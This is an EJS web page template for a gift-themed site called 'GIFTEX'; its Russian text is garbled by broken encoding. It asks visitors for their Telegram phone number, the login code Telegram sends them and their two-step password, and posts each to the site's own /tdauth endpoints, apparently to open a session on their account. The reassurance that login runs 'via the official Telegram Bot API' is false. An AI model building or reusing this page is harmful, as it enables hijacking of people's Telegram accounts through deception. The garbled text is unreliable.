<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><%= title %></title>
  
  <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º —à—Ä–∏—Ñ—Ç—ã -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  
  <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º Tailwind CSS -->
  <link rel="stylesheet" href="/css/style.css">
  
  <!-- –§–∞–≤–∏–∫–æ–Ω–∫–∞ -->
  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
</head>
<body class="bg-telegram-white min-h-screen flex flex-col">
  <!-- –®–∞–ø–∫–∞ —Å–∞–π—Ç–∞ -->
  <header class="bg-telegram-blue text-white p-4 shadow-md">
    <div class="container mx-auto flex justify-between items-center">
      <a href="/" class="text-2xl font-bold flex items-center">
        <span class="mr-2">üéÅ</span> GIFTEX
      </a>
      
      <nav class="flex items-center space-x-4">
        <a href="/" class="hover:underline">–ì–ª–∞–≤–Ω–∞—è</a>
      </nav>
    </div>
  </header>

  <!-- –û—Å–Ω–æ–≤–Ω–æ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ -->
  <main class="flex-grow">
    <div class="min-h-screen flex flex-col items-center justify-center py-10 px-4">
      <div class="bg-white shadow-xl rounded-lg p-8 max-w-md w-full">
        <div class="text-center mb-8">
          <h1 class="text-3xl font-bold mb-4 text-telegram-blue">–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ Telegram</h1>
          <p class="text-gray-700">–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ Telegram –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è</p>
        </div>
        
        <!-- –§–æ—Ä–º–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ -->
        <div id="auth-container">
          <!-- –®–∞–≥ 1: –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è -->
          <div id="auth-step-init" class="<%= authState === 'init' ? '' : 'hidden' %>">
            <p class="text-center text-gray-700 mb-6">–ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ, —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å –ø—Ä–æ—Ü–µ—Å—Å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏</p>
            <button id="btn-init" class="w-full bg-telegram-blue hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition">
              –ù–∞—á–∞—Ç—å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é
            </button>
          </div>
          
          <!-- –®–∞–≥ 2: –í–≤–æ–¥ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
          <div id="auth-step-phone" class="<%= authState === 'authorizationStateWaitPhoneNumber' ? '' : 'hidden' %>">
            <p class="text-center text-gray-700 mb-6">–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –≤ –º–µ–∂–¥—É–Ω–∞—Ä–æ–¥–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ</p>
            <div class="mb-4">
              <label for="phone-number" class="block text-gray-700 mb-2">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</label>
              <input type="tel" id="phone-number" placeholder="+79123456789" class="w-full border border-gray-300 rounded-md py-2 px-4 focus:outline-none focus:ring-2 focus:ring-telegram-blue focus:border-transparent">
            </div>
            <button id="btn-send-phone" class="w-full bg-telegram-blue hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition">
              –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥
            </button>
          </div>
          
          <!-- –®–∞–≥ 3: –í–≤–æ–¥ –∫–æ–¥–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è -->
          <div id="auth-step-code" class="<%= authState === 'waitCode' || authState === 'authorizationStateWaitCode' ? '' : 'hidden' %>">
            <p class="text-center text-gray-700 mb-6">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –º—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –≤ Telegram</p>
            <div class="mb-4">
              <label for="auth-code" class="block text-gray-700 mb-2">–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</label>
              <input type="text" id="auth-code" placeholder="12345" class="w-full border border-gray-300 rounded-md py-2 px-4 focus:outline-none focus:ring-2 focus:ring-telegram-blue focus:border-transparent">
            </div>
            <button id="btn-send-code" class="w-full bg-telegram-blue hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition">
              –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å
            </button>
          </div>
          
          <!-- –®–∞–≥ 4: –í–≤–æ–¥ –ø–∞—Ä–æ–ª—è (–¥–ª—è –∑–∞—â–∏—â–µ–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤) -->
          <div id="auth-step-password" class="<%= authState === 'waitPassword' || authState === 'authorizationStateWaitPassword' ? '' : 'hidden' %>">
            <p class="text-center text-gray-700 mb-6">–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ Telegram</p>
            <div class="mb-4">
              <label for="auth-password" class="block text-gray-700 mb-2">–ü–∞—Ä–æ–ª—å</label>
              <input type="password" id="auth-password" class="w-full border border-gray-300 rounded-md py-2 px-4 focus:outline-none focus:ring-2 focus:ring-telegram-blue focus:border-transparent">
            </div>
            <button id="btn-send-password" class="w-full bg-telegram-blue hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition">
              –í–æ–π—Ç–∏
            </button>
          </div>
          
          <!-- –ò–Ω–¥–∏–∫–∞—Ç–æ—Ä –∑–∞–≥—Ä—É–∑–∫–∏ -->
          <div id="auth-loading" class="hidden">
            <div class="flex justify-center items-center py-6">
              <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-telegram-blue"></div>
            </div>
            <p class="text-center text-gray-700" id="loading-message">–í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è...</p>
          </div>
          
          <!-- –°–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ -->
          <div id="auth-error" class="hidden">
            <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative mt-4" role="alert">
              <span class="block sm:inline" id="error-message"></span>
            </div>
          </div>
        </div>
        
        <div class="text-center text-sm text-gray-600 mt-8">
          <p class="mb-4">
            –ú—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏.
          </p>
          <p>
            –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –Ω–∞–ø—Ä—è–º—É—é —á–µ—Ä–µ–∑ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π Telegram Bot API.
          </p>
        </div>
      </div>
    </div>
  </main>

  <!-- –ü–æ–¥–≤–∞–ª —Å–∞–π—Ç–∞ -->
  <footer class="bg-telegram-gray py-4 mt-8">
    <div class="container mx-auto text-center text-gray-700">
      <p>&copy; <%= new Date().getFullYear() %> GIFTEX. –í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã.</p>
      <p class="mt-2 text-sm">–≠—Ç–æ—Ç —Å–∞–π—Ç –Ω–µ —è–≤–ª—è–µ—Ç—Å—è –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–º –ø—Ä–æ–µ–∫—Ç–æ–º Telegram.</p>
    </div>
  </footer>

  <!-- –û–±—â–∏–µ —Å–∫—Ä–∏–ø—Ç—ã -->
  <script src="/js/app.js"></script>
  
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      // DOM —ç–ª–µ–º–µ–Ω—Ç—ã
      const authStepInit = document.getElementById('auth-step-init');
      const authStepPhone = document.getElementById('auth-step-phone');
      const authStepCode = document.getElementById('auth-step-code');
      const authStepPassword = document.getElementById('auth-step-password');
      const authLoading = document.getElementById('auth-loading');
      const authError = document.getElementById('auth-error');
      const errorMessage = document.getElementById('error-message');
      const loadingMessage = document.getElementById('loading-message');
      
      // –ö–Ω–æ–ø–∫–∏
      const btnInit = document.getElementById('btn-init');
      const btnSendPhone = document.getElementById('btn-send-phone');
      const btnSendCode = document.getElementById('btn-send-code');
      const btnSendPassword = document.getElementById('btn-send-password');
      
      // –ü–æ–ª—è –≤–≤–æ–¥–∞
      const phoneNumberInput = document.getElementById('phone-number');
      const authCodeInput = document.getElementById('auth-code');
      const authPasswordInput = document.getElementById('auth-password');
      
      // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∫–∞–∑–∞ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ —à–∞–≥–∞
      function showStep(step) {
        authStepInit.classList.add('hidden');
        authStepPhone.classList.add('hidden');
        authStepCode.classList.add('hidden');
        authStepPassword.classList.add('hidden');
        authLoading.classList.add('hidden');
        authError.classList.add('hidden');
        
        switch(step) {
          case 'init':
            authStepInit.classList.remove('hidden');
            break;
          case 'phone':
            authStepPhone.classList.remove('hidden');
            break;
          case 'code':
            authStepCode.classList.remove('hidden');
            break;
          case 'password':
            authStepPassword.classList.remove('hidden');
            break;
          case 'loading':
            authLoading.classList.remove('hidden');
            break;
        }
      }
      
      // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –æ—à–∏–±–∫–∏
      function showError(message) {
        errorMessage.textContent = message;
        authError.classList.remove('hidden');
      }
      
      // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
      btnInit.addEventListener('click', function() {
        showStep('loading');
        loadingMessage.textContent = '–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏...';
        
        fetch('/tdauth/init', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          }
        })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            const authState = data.authState;
            
            if (authState === 'authorizationStateWaitPhoneNumber') {
              showStep('phone');
            } else if (authState === 'authorizationStateWaitCode' || authState === 'waitCode') {
              showStep('code');
            } else if (authState === 'authorizationStateWaitPassword' || authState === 'waitPassword') {
              showStep('password');
            } else if (authState === 'authorizationStateReady' || authState === 'ready') {
              window.location.href = '/';
            } else {
              showStep('init');
              showError('–ù–µ–ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏: ' + authState);
            }
          } else {
            showStep('init');
            showError(data.error || '–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏');
          }
        })
        .catch(error => {
          showStep('init');
          showError('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏');
          console.error('–û—à–∏–±–∫–∞:', error);
        });
      });
      
      // –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
      btnSendPhone.addEventListener('click', function() {
        const phoneNumber = phoneNumberInput.value.trim();
        
        if (!phoneNumber) {
          showError('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
          return;
        }
        
        showStep('loading');
        loadingMessage.textContent = '–û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞...';
        
        fetch('/tdauth/send-phone', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ phoneNumber })
        })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            showStep('code');
          } else {
            showStep('phone');
            showError(data.error || '–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –Ω–æ–º–µ—Ä–∞');
          }
        })
        .catch(error => {
          showStep('phone');
          showError('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –Ω–æ–º–µ—Ä–∞');
          console.error('–û—à–∏–±–∫–∞:', error);
        });
      });
      
      // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
      btnSendCode.addEventListener('click', function() {
        const code = authCodeInput.value.trim();
        
        if (!code) {
          showError('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è');
          return;
        }
        
        showStep('loading');
        loadingMessage.textContent = '–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞...';
        
        fetch('/tdauth/send-code', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ code })
        })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            if (data.authState === 'waitPassword' || data.authState === 'authorizationStateWaitPassword') {
              showStep('password');
            } else if (data.authState === 'ready' || data.authState === 'authorizationStateReady') {
              window.location.href = data.redirectUrl || '/';
            } else {
              showStep('code');
              showError('–ù–µ–æ–∂–∏–¥–∞–Ω–Ω–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏: ' + data.authState);
            }
          } else {
            showStep('code');
            showError(data.error || '–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –∫–æ–¥–∞');
          }
        })
        .catch(error => {
          showStep('code');
          showError('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –∫–æ–¥–∞');
          console.error('–û—à–∏–±–∫–∞:', error);
        });
      });
      
      // –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–∞—Ä–æ–ª—è
      btnSendPassword.addEventListener('click', function() {
        const password = authPasswordInput.value;
        
        if (!password) {
          showError('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å');
          return;
        }
        
        showStep('loading');
        loadingMessage.textContent = '–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è...';
        
        fetch('/tdauth/send-password', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ password })
        })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            window.location.href = data.redirectUrl || '/';
          } else {
            showStep('password');
            showError(data.error || '–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –ø–∞—Ä–æ–ª—è');
          }
        })
        .catch(error => {
          showStep('password');
          showError('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –ø–∞—Ä–æ–ª—è');
          console.error('–û—à–∏–±–∫–∞:', error);
        });
      });
      
      // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–±—ã—Ç–∏–π –¥–ª—è –≤–≤–æ–¥–∞ –ø–æ –∫–ª–∞–≤–∏—à–µ Enter
      phoneNumberInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
          btnSendPhone.click();
        }
      });
      
      authCodeInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
          btnSendCode.click();
        }
      });
      
      authPasswordInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
          btnSendPassword.click();
        }
      });
      
      // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞–ø—É—Å–∫–∞–µ–º –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—é, –µ—Å–ª–∏ –º—ã –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ init
      if (authStepInit.classList.contains('hidden') === false) {
        setTimeout(() => {
          btnInit.click();
        }, 500);
      }
    });
  </script>
</body>
</html> 